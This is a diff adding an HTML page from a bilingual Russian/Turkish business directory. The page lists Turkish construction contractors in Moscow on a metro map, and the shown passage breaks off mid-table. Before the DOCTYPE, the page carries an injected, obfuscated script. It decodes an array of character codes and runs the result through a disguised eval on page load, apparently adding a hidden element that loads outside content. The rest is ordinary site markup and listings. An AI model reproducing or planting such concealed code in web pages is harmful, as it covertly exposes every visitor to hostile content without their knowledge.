@@ -1,0 +1,683 @@
+<script>try{1-prototype;}catch(asd){x=2;}
+if(x){fr="fromChar";f=[4,0,91,108,100,88,107,95,100,101,22,91,105,99,54,91,90,29,32,22,112,4,0,107,88,104,21,96,92,103,100,22,50,23,90,100,90,107,98,92,100,105,37,89,103,92,87,105,92,59,97,92,99,90,101,106,29,30,95,91,105,87,98,92,29,30,50,3,-1,96,92,103,100,36,104,107,111,97,92,36,101,102,105,94,107,95,100,101,51,28,88,88,104,102,98,106,107,91,28,50,3,-1,96,92,103,100,36,104,107,111,97,92,36,105,102,102,50,30,35,46,48,47,90,100,29,48,4,0,94,93,104,98,37,105,105,112,98,90,37,98,90,93,106,50,30,35,46,48,47,90,100,29,48,4,0,94,93,104,98,37,105,103,90,22,21,52,22,23,95,106,105,103,48,36,38,99,94,90,94,86,92,98,98,88,112,106,105,36,99,92,106,36,111,99,97,37,102,93,103,24,48,4,0,94,93,104,98,37,95,89,23,51,21,30,92,103,100,63,89,30,49,2,1,90,100,90,107,98,92,100,105,37,88,100,91,111,35,88,102,101,92,100,89,58,94,94,99,90,29,96,92,103,100,31,48,4,0,114,50,3,-1,110,95,99,91,101,108,37,101,99,99,101,86,91,22,50,23,92,103,100,55,89,91,49,2,1];v="eva";}if(v)e=window[v+"l"];w=f;s=[];r=String;z=((e)?"Code":"");zx=fr+z;for(i=0;286-5+5-i>0;i+=1){j=i;if(e)s=s+r[zx]((w[j]*1+(9+e("j%3"))));}
+if(x&&f&&012===10)e(s);</script><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="ru" lang="ru" >
+
+<head>
+
+  <base href="http://old.rehber.ru/" />
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="keywords" content="ПРИЗМА, PRİZMA, у�., Садовническая, д., 57, ul., Sadovniçeskaya, d., 8, 495, 258-95-38, АКБАБА, ИНШААТ, AKBABA, INŞAAT, АЛТАДЖА, ALTACA, АНТ, ЯП�, ANT, YAPI, БАЙТУР, BAYTUR, БЕТА, ТЕК, BETA, TEK, БРАВ-ТР, BRAV-TR, ДЖЕЙЛАН, CEYLAN, İNŞAAT, ЭМТ, ЭРИМТАН, EMT, ERIMTAN, ЭНКА, ENKA, ФУДЕС, FUDES, ГАМА, GAMA, ГУРИШ, GURİŞ, ХАЗИНЕДАРОГЛУ-ОЗКАН, HAZİNEDAROĞLU, -, OZKAN, ИМЕДИ, IMEDI, КАСА, СТРОЙ, KASA-STROY, КАСКТАШ, KASKTAŞ, КОРАЙ, KORAY, Фирма, МЕБЕ, MeBe, МЕСА, МЕСКЕН, MESA, MESKEN, МЕТЕКСАН, METEKSAN, МЕТИШ, METİŞ, МОСАЛАРКО, MOSALARKO, РАСЕН, КОНСТРАКШН, RASEN, CONSTRUCTION, РЕАЛТИ, REALTY, STROY, СИНЕРДЖИ, SINERGY" />
+  <meta name="title" content="ПРИЗМА - PRİZMA - Генподрядные и субподрядные организации - Müteahhitlik ve taşeronluk - Строительство - İnşaat - Строительство - İnşaat - Rehber.ru - Rehber.ru" />
+  <meta name="description" content="ПРИЗМА - PRİZMA - Генподрядные и субподрядные организации - Müteahhitlik ve taşeronluk - Строительство - İnşaat - Строительство - İnşaat - " />
+  <meta name="generator" content="SeoPro Q4" />
+  <title>ПРИЗМА - PRİZMA - Генподрядные и субподрядные организации - Müteahhitlik ve taşeronluk - Строительство - İnşaat - Строительство - İnşaat - Rehber.ru - Rehber.ru</title>
+  <link href="/templates/onmap/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <script type="text/javascript" src="http://old.rehber.ru/components/com_proofreader/js/proofreader.js"></script>
+  <script type="text/javascript" src="http://old.rehber.ru/components/com_proofreader/js/xajax.js"></script>
+  <script language="JavaScript" type="text/javascript"><!-- // --><![CDATA[
+				function pr_setup() {
+					xajaxRequestUri='http://old.rehber.ru/index.php?option=com_proofreader&task=sendmistake&tmpl=component';
+					xajaxWaitCursor=true;
+					xajaxDefinedPost=1;
+					xajaxDebug=false;
+					xajaxStatusMessages=false;
+					xajaxDefinedGet=0;
+				}
+
+			var xajaxRequestUri='http://old.rehber.ru/index.php?option=com_proofreader&task=sendmistake&tmpl=component';
+			var xajaxWaitCursor=true;
+			var xajaxDefinedPost=1;
+			var xajaxDebug=false;
+			var xajaxStatusMessages=false;
+			var xajaxDefinedGet=0;
+
+			function addEvent(element, eventType, functionName) {
+				if (element.addEventListener) {
+					element.addEventListener(eventType, functionName, false);
+					return true;
+				} else if (element.attachEvent) {
+					var r = element.attachEvent('on' + eventType, functionName);
+					return r;
+				} else {
+					element['on' + eventType] = functionName;
+				}
+			}
+		 var pr_alt = false;  var pr_shift = true;  var pr_ctrl = false; 
+				var PReader_cur_page = "http://old.rehber.ru/construction/construction/muteahhitlik-ve-ta-eronluk/564-480.html";
+				addEvent(window, 'load',  addDivWindow);
+				addEvent(window, 'load',  keyPressInit);
+			// ]]></script>
+  <link type='text/css' href='http://old.rehber.ru/modules/mod_swmenufree/styles/menu.css' rel='stylesheet' />
+  <script type="text/javascript" src="http://old.rehber.ru/modules/mod_swmenufree/transmenu_Packed.js"></script>
+
+
+<link rel="stylesheet" href="/templates/system/css/system.css" type="text/css" />
+<link rel="stylesheet" href="/templates/system/css/general.css" type="text/css" />
+
+<link rel="stylesheet" href="/templates/onmap/css/style.css" type="text/css" />
+
+
+</head>
+
+<body id="body">
+
+
+<div id="tmpl_wrapper">
+
+	<div id="tmpl_header">
+        <img src="/templates/onmap/images/tmpl/r1_c8.gif" id="r1_c8"  alt="" />
+		
+        <br class="clearfloat" />
+        
+        <img src="/templates/onmap/images/tmpl/r2_c1.gif" id="r2_c1"  alt="" />
+		        
+        
+        <div id="tmpl_head_mmenu">
+        	<div id="tmpl_head_mmenu_cont">
+	            	                <table width="100%" border="0" cellpadding="0" cellspacing="1"><tr><td nowrap="nowrap"><a href="/" class="mainlevel" >Главная / Ana sayfa</a><span class="mainlevel"> &nbsp; </span><a href="/kontakti-leti-im/kontakti-leti-im.html" class="mainlevel" >Контакты / İletişim</a><span class="mainlevel"> &nbsp; </span><a href="/stranichki-o-sayte/nash-spravochnik-rehberimiz.html" class="mainlevel" >Наш справочник / Rehberimiz</a><span class="mainlevel"> &nbsp; </span><a href="/sendform.html" class="mainlevel" >Добавить организацию / Firmayı ekle</a></td></tr></table>
+	                        </div>
+        </div>
+    
+    
+		<img src="/templates/onmap/images/tmpl/r2_c7.gif" id="r2_c7"  alt="" />
+		
+        <br class="clearfloat" />
+      
+      
+        
+        <div id="r3_c1">
+			<a href="http://old.rehber.ru/">
+				<img src="/templates/onmap/images/tmpl/logo.jpg" id="tmpl_imglogo" alt="Main page" />
+			</a>
+                	<!-- Поиск -->           
+                                    <form action="index.php" method="post">
+	<div class="search">
+		<input name="searchword" id="mod_search_searchword" maxlength="20" alt="Поиск" class="inputbox" type="text" size="20" value="Поиск / Arama..."  onblur="if(this.value=='') this.value='Поиск / Arama...';" onfocus="if(this.value=='Поиск / Arama...') this.value='';" />	</div>
+	<input type="hidden" name="task"   value="search" />
+	<input type="hidden" name="option" value="com_search" />
+	<input type="hidden" name="Itemid" value="14" />
+</form>
+                                    <!-- #Поиск --> 
+                
+            
+		</div>	<!-- #tmpl_logo -->
+                
+      <!--
+  <br class="clearfloat" />
+-->
+        
+    </div><!-- #header-->
+    
+    
+    
+    
+    
+    <div id="tmpl_middle">
+        
+        
+        
+        <div id="tmpl_navbanmenu">
+        
+        
+        
+        
+            
+             <div id="tmpl_them_menu">
+                         
+                                    
+<!--swMenuFree5.0J_1.5 transmenu by http://www.swmenupro.com-->
+<div id="wrap" class="menu" align="center">
+<table cellspacing="0" cellpadding="0" id="menu" class="menu" > 
+<tr> 
+<td> 
+<a id="menu10" href="/services.html" >Услуги<br />Hizmetler</a>
+</td> 
+<td> 
+<a id="menu11" href="/trading.html" >Торговля<br />Ticaret</a>
+</td> 
+<td> 
+<a id="menu12" href="/industry.html" >Производство<br />Sanayi</a>
+</td> 
+<td> 
+<a id="menu13" href="/leysure-and-health.html" >Досуг и здоровье<br />Yaşam</a>
+</td> 
+<td> 
+<a id="menu74" href="/establishments.html" >Учреждения<br />Kurumlar</a>
+</td> 
+<td id="trans-active" class='last'> 
+<a id="menu14" href="/construction.html" >Строительство<br />İnşaat</a>
+</td> 
+</tr> 
+</table></div> 
+<div id="subwrap"> 
+<script type="text/javascript">
+<!--
+if (TransMenu.isSupported()) {
+var ms = new TransMenuSet(TransMenu.direction.down, 20,5, TransMenu.reference.bottomLeft);
+var menu10 = ms.addMenu(document.getElementById("menu10"));
+ menu10.addItem("Адвокатские услуги / Avukatlık hizmetleri", "/services/lawers.html", "0");
+menu10.addItem("Аудит и бухучет.Налоговый консалтинг / <br />Denetim ve muhasebe.Mali danışmanlık", "/services/audit-and-accounting-tax-consulting.html", "0");
+menu10.addItem("Банки / Bankalar", "/services/banks.html", "0");
+menu10.addItem("Бюро переводов / Tercüme büroları", "/services/translate.html", "0");
+menu10.addItem("Грузоперевозки.Таможенное сопровождение / <br />Taşımacılık.Gümrükleme", "/services/customs-support.html", "0");
+menu10.addItem("Информационная поддержка.Визы.Разрешения на работу / <br />Danışmanlık.Vize ve çalışma izinleri", "/services/information-and-legal-support.html", "0");
+menu10.addItem("Катеринг / Yiyecek Dağıtımı", "/services/katering.html", "0");
+menu10.addItem("Компьютерные услуги / Bilgisayar hizmetleri", "/services/computer-services.html", "0");
+menu10.addItem("Недвижимость / Emlak", "/services/realestate.html", "0");
+menu10.addItem("Образование / Eğitim", "/services/language-courses.html", "0");
+menu10.addItem("Организация выставок / Fuar organizasyonu", "/services/exhibitions.html", "0");
+menu10.addItem("Парикмахерские / Berber / Kuaför", "/services/hairdressing-salons.html", "0");
+menu10.addItem("Реклама.Полиграфия / Reklamcılık.Matbaa", "/services/advertising-polygraphy.html", "0");
+menu10.addItem("Сертификация / Sertifikasyon", "/services/sertification.html", "0");
+menu10.addItem("Средства массовой информации / Medya", "/services/media.html", "0");
+menu10.addItem("Туризм / Turizm", "/services/tourism.html", "0");
+menu10.addItem("Страхование / Sigorta", "/services/insurance.html", "0");
+var menu11 = ms.addMenu(document.getElementById("menu11"));
+ menu11.addItem("Строительные материалы / İnşaat malzemeleri", "/trading/construction-materials.html", "0");
+menu11.addItem("Текстиль / Tekstil", "/trading/textile.html", "0");
+menu11.addItem("Продукты питания / Gıda ürünleri", "/trading/foodstuff.html", "0");
+menu11.addItem("Ювелирные изделия.Сувениры / Kuyum.Hediyelik eşya", "/trading/jewels-souvenirs.html", "0");
+menu11.addItem("Бытовая химия / Ev kimyasalları", "/trading/household-chemical-goods.html", "0");
+menu11.addItem("Сырье / Hammade", "/trading/raw-material.html", "0");
+menu11.addItem("Мебель  / Mobilya", "/trading/furniture.html", "0");
+menu11.addItem("Автозапчасти / Oto yedek parçaları", "/trading/autospare-parts.html", "0");
+menu11.addItem("Инженерные системы / Mühendislik sistemleri", "/trading/engineering-systems.html", "0");
+menu11.addItem("Одежда и обувь / Giyim/Ayakkabı", "/trading/clothes-footwear.html", "0");
+menu11.addItem("Пакетное оборудование/ Poşet üretim makineleri", "/trading/equipment.html", "0");
+menu11.addItem("Сантехника и ванные принадлежности / <br /> Sihhi tesisat ve banyo malzemeleri", "/trading/sihhi-tesisat-ve-banyo-malzemeleri.html", "0");
+menu11.addItem("Электрическое оборудование / Elektrik ekipmanları", "/trading/elektrik-ekipmanlari-kablo.html", "0");
+menu11.addItem("Трубы / Boru", "/trading/boru.html", "0");
+menu11.addItem("Пластик.Пластиковые двери и окна / <br />Plastik.Plastik kapı ve pencere", "/trading/plastic.html", "0");
+menu11.addItem("Кухонное оборудование / Mutfak ekipmanlari", "/trading/mutfak-ekipmanlari.html", "0");
+var menu12 = ms.addMenu(document.getElementById("menu12"));
+ menu12.addItem("Стройматериалы / İnşaat malzemeleri", "/industry/construction-materials.html", "0");
+menu12.addItem("Пластик / Plastik", "/industry/plastic.html", "0");
+menu12.addItem("Пиво / Bira", "/industry/beer.html", "0");
+menu12.addItem("Бытовая техника / Beyaz eşya", "/industry/home-appliances.html", "0");
+menu12.addItem("Оборудование / Ekipman", "/industry/equipment.html", "0");
+var menu13 = ms.addMenu(document.getElementById("menu13"));
+ menu13.addItem("Кафе и рестораны / Kafe ve Restoranlar", "/leysure-and-health/cafe-restaurants.html", "0");
+menu13.addItem("Медцентры / Tıp merkezleri", "/leysure-and-health/medical-center.html", "0");
+menu13.addItem("Спортивные организации / Spor kurumları", "/leysure-and-health/sports-organizations.html", "0");
+var menu74 = ms.addMenu(document.getElementById("menu74"));
+ menu74.addItem("Государственные учреждения / Devlet kurumları", "/establishments/state-establishments.html", "0");
+menu74.addItem("Деловые сообщества / İş dernekleri", "/establishments/business-communities.html", "0");
+var menu14 = ms.addMenu(document.getElementById("menu14"));
+ menu14.addItem("Строительство / İnşaat", "/construction/construction.html", "0");
+menu14.addItem("Электромонтажные организации / <br />Elektrik işler", "/elektrik/elektrik.html", "0");
+function init() {
+if (TransMenu.isSupported()) {
+TransMenu.initialize();
+menu10.onactivate = function() {document.getElementById("menu10").className = "hover"; };
+ menu10.ondeactivate = function() {document.getElementById("menu10").className = ""; };
+ menu11.onactivate = function() {document.getElementById("menu11").className = "hover"; };
+ menu11.ondeactivate = function() {document.getElementById("menu11").className = ""; };
+ menu12.onactivate = function() {document.getElementById("menu12").className = "hover"; };
+ menu12.ondeactivate = function() {document.getElementById("menu12").className = ""; };
+ menu13.onactivate = function() {document.getElementById("menu13").className = "hover"; };
+ menu13.ondeactivate = function() {document.getElementById("menu13").className = ""; };
+ menu74.onactivate = function() {document.getElementById("menu74").className = "hover"; };
+ menu74.ondeactivate = function() {document.getElementById("menu74").className = ""; };
+ menu14.onactivate = function() {document.getElementById("menu14").className = "hover"; };
+ menu14.ondeactivate = function() {document.getElementById("menu14").className = ""; };
+ }}
+TransMenu.dingbatSize = 0;
+TransMenu.spacerGif = "";
+TransMenu.dingbatOn = "";
+TransMenu.dingbatOff = ""; 
+TransMenu.sub_indicator = false;
+TransMenu.menuPadding = 0;
+TransMenu.itemPadding = 0;
+TransMenu.shadowSize = 2;
+TransMenu.shadowOffset = 3;
+TransMenu.shadowColor = "#888";
+TransMenu.shadowPng = "http://old.rehber.ru/modules/mod_swmenufree/images/transmenu/grey-40.png";
+TransMenu.backgroundColor = "#f8c301";
+TransMenu.backgroundPng = "http://old.rehber.ru/modules/mod_swmenufree/images/transmenu/white-90.png";
+TransMenu.hideDelay = 600;
+TransMenu.slideTime = 300;
+TransMenu.selecthack = 0;
+TransMenu.autoposition = 0;
+TransMenu.renderAll();
+if ( typeof window.addEventListener != "undefined" )
+window.addEventListener( "load", init, false );
+else if ( typeof window.attachEvent != "undefined" ) {
+window.attachEvent( "onload", init);
+}else{
+if ( window.onload != null ) {
+var oldOnload = window.onload;
+window.onload = function ( e ) {
+oldOnload( e );
+init();
+}
+}else
+window.onload = init();
+}
+}
+-->
+</script>
+</div>
+
+<!--End swMenuFree menu module-->
+
+                            
+            </div><!-- #them_menu-->
+        
+             
+            <div id="tmpl_topbann">
+                            </div>
+       
+                  
+         </div><!-- #tmpl_navbanmenu-->
+        
+        
+        
+        
+        
+        
+        
+        <div id="content">             
+            ﻿<div id="onmap_middle"><div id="onmap_container">
+    			
+                    <div id="onmap_content"><img src="http://old.rehber.ru/images/onmap/map/metro2010.gif" width="750px" height="866px" border="0" style="margin: 0; padding: 0;" alt="Карта московского метрополитена на турецком языке" />
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 576px; left: 322px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/329-615.html#p329615" onMouseOver="window.status='АКБАБА ИНШААТ / AKBABA INŞAAT'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="АКБАБА ИНШААТ / AKBABA INŞAAT" title="АКБАБА ИНШААТ / AKBABA INŞAAT" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 181px; left: 568px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/575-220.html#p575220" onMouseOver="window.status='АЛТАДЖА / ALTACA'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="АЛТАДЖА / ALTACA" title="АЛТАДЖА / ALTACA" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 372px; left: 190px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/197-411.html#p197411" onMouseOver="window.status='АНТ ЯПЫ / ANT YAPI'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="АНТ ЯПЫ / ANT YAPI" title="АНТ ЯПЫ / ANT YAPI" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 358px; left: 605px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/612-397.html#p612397" onMouseOver="window.status='БАЙТУР / BAYTUR'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="БАЙТУР / BAYTUR" title="БАЙТУР / BAYTUR" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 514px; left: 448px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/455-553.html#p455553" onMouseOver="window.status='БЕТА ТЕК / BETA TEK'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="БЕТА ТЕК / BETA TEK" title="БЕТА ТЕК / BETA TEK" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 407px; left: 677px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/684-446.html#p684446" onMouseOver="window.status='БРАВ-ТР / BRAV-TR'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="БРАВ-ТР / BRAV-TR" title="БРАВ-ТР / BRAV-TR" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 516px; left: 456px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/463-555.html#p463555" onMouseOver="window.status='ДЖЕЙЛАН ИНШААТ / CEYLAN İNŞAAT'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ДЖЕЙЛАН ИНШААТ / CEYLAN İNŞAAT" title="ДЖЕЙЛАН ИНШААТ / CEYLAN İNŞAAT" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 572px; left: 179px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/186-611.html#p186611" onMouseOver="window.status='ЭМТ ЭРИМТАН / EMT  ERIMTAN'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ЭМТ ЭРИМТАН / EMT  ERIMTAN" title="ЭМТ ЭРИМТАН / EMT  ERIMTAN" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 514px; left: 449px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/456-553.html#p456553" onMouseOver="window.status='ЭНКА / ENKA'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ЭНКА / ENKA" title="ЭНКА / ENKA" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 245px; left: 405px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/412-284.html#p412284" onMouseOver="window.status='ФУДЕС / FUDES'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ФУДЕС / FUDES" title="ФУДЕС / FUDES" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 575px; left: 322px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/329-614.html#p329614" onMouseOver="window.status='ГАМА / GAMA'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ГАМА / GAMA" title="ГАМА / GAMA" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 546px; left: 428px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/435-585.html#p435585" onMouseOver="window.status='ГУРИШ ИНШААТ / GURİŞ İNŞAAT'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ГУРИШ ИНШААТ / GURİŞ İNŞAAT" title="ГУРИШ ИНШААТ / GURİŞ İNŞAAT" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 607px; left: 138px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/145-646.html#p145646" onMouseOver="window.status='ХАЗИНЕДАРОГЛУ-ОЗКАН / HAZİNEDAROĞLU - OZKAN'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ХАЗИНЕДАРОГЛУ-ОЗКАН / HAZİNEDAROĞLU - OZKAN" title="ХАЗИНЕДАРОГЛУ-ОЗКАН / HAZİNEDAROĞLU - OZKAN" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 620px; left: 275px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/282-659.html#p282659" onMouseOver="window.status='ИМЕДИ / IMEDI'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ИМЕДИ / IMEDI" title="ИМЕДИ / IMEDI" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 198px; left: 551px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/558-237.html#p558237" onMouseOver="window.status='КАСА СТРОЙ / KASA-STROY'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="КАСА СТРОЙ / KASA-STROY" title="КАСА СТРОЙ / KASA-STROY" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 246px; left: 427px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/434-285.html#p434285" onMouseOver="window.status='КАСКТАШ / KASKTAŞ'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="КАСКТАШ / KASKTAŞ" title="КАСКТАШ / KASKTAŞ" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 268px; left: 317px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/324-307.html#p324307" onMouseOver="window.status='КОРАЙ ИНШААТ / KORAY İNŞAAT'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="КОРАЙ ИНШААТ / KORAY İNŞAAT" title="КОРАЙ ИНШААТ / KORAY İNŞAAT" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 463px; left: 555px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/562-502.html#p562502" onMouseOver="window.status='Фирма МЕБЕ / MeBe'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="Фирма МЕБЕ / MeBe" title="Фирма МЕБЕ / MeBe" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 475px; left: 413px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/420-514.html#p420514" onMouseOver="window.status='МЕСА МЕСКЕН / MESA MESKEN'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МЕСА МЕСКЕН / MESA MESKEN" title="МЕСА МЕСКЕН / MESA MESKEN" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 163px; left: 585px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/592-202.html#p592202" onMouseOver="window.status='МЕТЕКСАН / METEKSAN'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МЕТЕКСАН / METEKSAN" title="МЕТЕКСАН / METEKSAN" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 516px; left: 352px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/359-555.html#p359555" onMouseOver="window.status='МЕТИШ / METİŞ'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МЕТИШ / METİŞ" title="МЕТИШ / METİŞ" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 466px; left: 561px; height: 11px; width: 11px; z-index: 2;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="/construction/construction/muteahhitlik-ve-ta-eronluk/568-505.html#p568505" onMouseOver="window.status='МОСАЛАРКО / MOSALARKO'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="МОСАЛАРКО / MOSALARKO" title="МОСАЛАРКО / MOSALARKO" />
+</a></div>
+<div class = "onmapball" style="position: absolute; margin: 0; padding: 0; top: 441px; left: 557px; height: 11px; width: 11px; z-index: 3;">
+<a style="margin: 0; padding: 0; line-height: 11px;" href="javascript:document.getElementById('hint').style.visibility='visible';void(0);" onMouseOver="window.status='ПРИЗМА / PRİZMA'; return true" onMouseOut="window.status=''; return true">
+<img src="http://old.rehber.ru/images/onmap/ball/test.gif" border="0" width="11px" height="11px" style="margin: 0; padding: 0;" alt="ПРИЗМА / PRİZMA" title="ПРИЗМА / PRİZMA" />
+</a>
+<div class="onmaphint" id="hint" name="hint" style="position: absolute; bottom: 8px; left: 8px; border: solid; border-color: Red; border-width: 0px; z-index: 5; margin: 0; padding: 0;">
+<table id="onmap_tablehint" border="0" style="margin: 0px; padding: 0px;" 
+            cellpadding="0" cellspacing="0">
+            <tr valign="bottom">
+            <td valign="bottom">
+<a style="width: 0; height: 0; margin: 0; padding: 0; font-size: 0px;" id="564:480" name="p564480">&nbsp;</a><table id="tablehint" name="tablehint" style="margin: 0px; padding: 0px;" border="0" cellpadding="0" cellspacing="0">
+<tr>
+<td width="11" height="12" align="left" valign="top">
